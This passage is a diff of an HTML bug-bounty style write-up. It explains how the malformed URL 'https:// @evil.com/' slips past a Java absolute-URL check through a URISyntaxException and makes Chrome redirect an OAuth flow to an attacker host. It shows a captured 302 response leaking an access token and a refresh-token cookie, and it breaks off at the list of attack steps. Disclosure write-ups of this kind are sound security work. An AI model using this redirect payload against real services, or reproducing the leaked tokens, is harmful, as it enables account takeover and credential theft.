-<span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+    boolean result = false;
 
-<span class="w">    </span><span class="k">try</span><span class="w"> </span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="n">URI</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URI</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
-<span class="w">        </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uri</span><span class="p">.</span><span class="na">isAbsolute</span><span class="p">();</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">URISyntaxException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="c1">//Ignore</span>
+    try 
+    {
+        URI uri = new URI(url);
+        result = uri.isAbsolute();
+    }
+    catch (URISyntaxException e) {} //Ignore
 
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div>
+    return result;
+}
+</code></pre>
 
 <p>The <code>isAbsolute</code> function receives a <code>url</code> and first checks if it starts with <code>//</code> because that will translate to <code>http://whatever</code>, let's check some examples from the <a href="https://www.rfc-editor.org/rfc/rfc3986">RFC 3986</a> for the URI syntax :</p>
-<div class="codehilite"><pre><span></span><code><span class="s2">&quot;g:h&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;g:h&quot;</span>
-<span class="s2">&quot;g&quot;</span><span class="w">             </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g&quot;</span>
-<span class="s2">&quot;./g&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g&quot;</span>
-<span class="s2">&quot;g/&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g/&quot;</span>
-<span class="s2">&quot;/g&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/g&quot;</span>
-<span class="s2">&quot;//g&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://g&quot;</span>
-<span class="s2">&quot;?y&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/d;p?y&quot;</span>
-<span class="s2">&quot;g?y&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g?y&quot;</span>
-<span class="s2">&quot;#s&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/d;p?q#s&quot;</span>
-<span class="s2">&quot;g#s&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g#s&quot;</span>
-<span class="s2">&quot;g?y#s&quot;</span><span class="w">         </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g?y#s&quot;</span>
-<span class="s2">&quot;;x&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/;x&quot;</span>
-<span class="s2">&quot;g;x&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g;x&quot;</span>
-<span class="s2">&quot;g;x?y#s&quot;</span><span class="w">       </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g;x?y#s&quot;</span>
-<span class="s2">&quot;&quot;</span><span class="w">              </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/d;p?q&quot;</span>
-<span class="s2">&quot;.&quot;</span><span class="w">             </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/&quot;</span>
-<span class="s2">&quot;./&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/&quot;</span>
-<span class="s2">&quot;..&quot;</span><span class="w">            </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/&quot;</span>
-<span class="s2">&quot;../&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/&quot;</span>
-<span class="s2">&quot;../g&quot;</span><span class="w">          </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/g&quot;</span>
-<span class="s2">&quot;../..&quot;</span><span class="w">         </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/&quot;</span>
-<span class="s2">&quot;../../&quot;</span><span class="w">        </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/&quot;</span>
-<span class="s2">&quot;../../g&quot;</span><span class="w">       </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/g&quot;</span>
-</code></pre></div>
+<pre class="codehilite"><code>&quot;g:h&quot;           =  &quot;g:h&quot;
+&quot;g&quot;             =  &quot;http://a/b/c/g&quot;
+&quot;./g&quot;           =  &quot;http://a/b/c/g&quot;
+&quot;g/&quot;            =  &quot;http://a/b/c/g/&quot;
+&quot;/g&quot;            =  &quot;http://a/g&quot;
+&quot;//g&quot;           =  &quot;http://g&quot;
+&quot;?y&quot;            =  &quot;http://a/b/c/d;p?y&quot;
+&quot;g?y&quot;           =  &quot;http://a/b/c/g?y&quot;
+&quot;#s&quot;            =  &quot;http://a/b/c/d;p?q#s&quot;
+&quot;g#s&quot;           =  &quot;http://a/b/c/g#s&quot;
+&quot;g?y#s&quot;         =  &quot;http://a/b/c/g?y#s&quot;
+&quot;;x&quot;            =  &quot;http://a/b/c/;x&quot;
+&quot;g;x&quot;           =  &quot;http://a/b/c/g;x&quot;
+&quot;g;x?y#s&quot;       =  &quot;http://a/b/c/g;x?y#s&quot;
+&quot;&quot;              =  &quot;http://a/b/c/d;p?q&quot;
+&quot;.&quot;             =  &quot;http://a/b/c/&quot;
+&quot;./&quot;            =  &quot;http://a/b/c/&quot;
+&quot;..&quot;            =  &quot;http://a/b/&quot;
+&quot;../&quot;           =  &quot;http://a/b/&quot;
+&quot;../g&quot;          =  &quot;http://a/b/g&quot;
+&quot;../..&quot;         =  &quot;http://a/&quot;
+&quot;../../&quot;        =  &quot;http://a/&quot;
+&quot;../../g&quot;       =  &quot;http://a/g&quot;
+</code></pre>
 
 <p>If it starts with only a <code>/</code> is not an absolute URL, and then it passes the <code>url</code> to the <code>URI</code> class. The catch here is that if <code>URISyntaxException</code> is raised the function will return <code>false</code>, telling that the URL is not absolute and then redirecting the user. At first glance this looks okay, because if an URL is not valid why would the redirect work, right ? Wrong! This only works if the client actually doing the redirect, the browser in this case, complies with the RFC and Chrome does NOT, wtf. Now we need to find an absolute URL that is not valid but that Chrome accepts on the <code>Location</code> header.</p>
 <p>I did some fuzzing and some manual testing and ended up with <code>https:// @evil.com/</code>, note the space. This is not a valid URL by the RFC: </p>
-<div class="codehilite"><pre><span></span><code><span class="n">unreserved</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">ALPHA</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">DIGIT</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;-&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;_&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;~&quot;</span>
-<span class="n">pct</span><span class="o">-</span><span class="n">encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;%&quot;</span><span class="w"> </span><span class="n">HEXDIG</span><span class="w"> </span><span class="n">HEXDIG</span>
-<span class="n">sub</span><span class="o">-</span><span class="n">delims</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;!&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;$&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;&amp;&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;(&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;)&quot;</span>
-<span class="w">                  </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;*&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;+&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;,&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;;&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;=&quot;</span>
-<span class="n">userinfo</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="w"> </span><span class="n">unreserved</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">pct</span><span class="o">-</span><span class="n">encoded</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">sub</span><span class="o">-</span><span class="n">delims</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="p">)</span>
-<span class="n">authority</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="n">userinfo</span><span class="w"> </span><span class="s">&quot;@&quot;</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="p">]</span>
-</code></pre></div>
+<pre class="codehilite"><code>unreserved  = ALPHA / DIGIT / &quot;-&quot; / &quot;.&quot; / &quot;_&quot; / &quot;~&quot;
+pct-encoded = &quot;%&quot; HEXDIG HEXDIG
+sub-delims  = &quot;!&quot; / &quot;$&quot; / &quot;&amp;&quot; / &quot;'&quot; / &quot;(&quot; / &quot;)&quot;
+                  / &quot;*&quot; / &quot;+&quot; / &quot;,&quot; / &quot;;&quot; / &quot;=&quot;
+userinfo    = *( unreserved / pct-encoded / sub-delims / &quot;:&quot; )
+authority   = [ userinfo &quot;@&quot; ] host [ &quot;:&quot; port ]
+</code></pre>
 
 <p>No whitespace in the <code>userinfo</code>. This will end up on the <code>catch</code> statement, bypassing the check and redirecting the user to <code>evil.com</code>, leaking the <code>access_token</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">302</span> <span class="ne">Found</span>
-<span class="na">Date</span><span class="o">:</span> <span class="l">Sat, 14 May 2022 04:08:37 GMT</span>
-<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
-<span class="na">Location</span><span class="o">:</span> <span class="l">https:// @evil.com/#%7B%22access_token%22%3A%22ghu_eEEIwuwg1GN1FwidVj4TS4pAa8plEc02asJs%22%2C%22expires_in%22%3A28800%7D</span>
-<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">auth-state= ;path=/github2; expires=Thu, 01 Jan 1970 00:00:00 UTC; Secure; HttpOnly; SameSite=none</span>
-<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">auth-tokenIv1.98d62f0431e40543=ghr_MRUNjYWPUiKUDKFlQTxcT6442q0L6l6LdWcKf9XBqeYZV3bYYhMyaX6fYJV8kuKk1WRO6Y4gQHzK; Max-Age=31536000;path=/github2; Secure; HttpOnly; SameSite=none</span>
-<span class="na">X-Cloud-Trace-Context</span><span class="o">:</span> <span class="l">766df5ad8123a0fa5701fc92aec830d4</span>
-<span class="na">Cf-Cache-Status</span><span class="o">:</span> <span class="l">DYNAMIC</span>
-<span class="na">Expect-Ct</span><span class="o">:</span> <span class="l">max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span>
-<span class="na">Strict-Transport-Security</span><span class="o">:</span> <span class="l">max-age=31536000; includeSubDomains</span>
-<span class="na">X-Content-Type-Options</span><span class="o">:</span> <span class="l">nosniff</span>
-<span class="na">Server</span><span class="o">:</span> <span class="l">cloudflare</span>
-<span class="na">Cf-Ray</span><span class="o">:</span> <span class="l">70b0c6119831273d-FOR</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-http">HTTP/2 302 Found
+Date: Sat, 14 May 2022 04:08:37 GMT
+Content-Type: text/html
+Location: https:// @evil.com/#%7B%22access_token%22%3A%22ghu_eEEIwuwg1GN1FwidVj4TS4pAa8plEc02asJs%22%2C%22expires_in%22%3A28800%7D
+Set-Cookie: auth-state= ;path=/github2; expires=Thu, 01 Jan 1970 00:00:00 UTC; Secure; HttpOnly; SameSite=none
+Set-Cookie: auth-tokenIv1.98d62f0431e40543=ghr_MRUNjYWPUiKUDKFlQTxcT6442q0L6l6LdWcKf9XBqeYZV3bYYhMyaX6fYJV8kuKk1WRO6Y4gQHzK; Max-Age=31536000;path=/github2; Secure; HttpOnly; SameSite=none
+X-Cloud-Trace-Context: 766df5ad8123a0fa5701fc92aec830d4
+Cf-Cache-Status: DYNAMIC
+Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+Server: cloudflare
+Cf-Ray: 70b0c6119831273d-FOR
+</code></pre>
 
 <p>The steps of the attack are:</p>
 <ol>
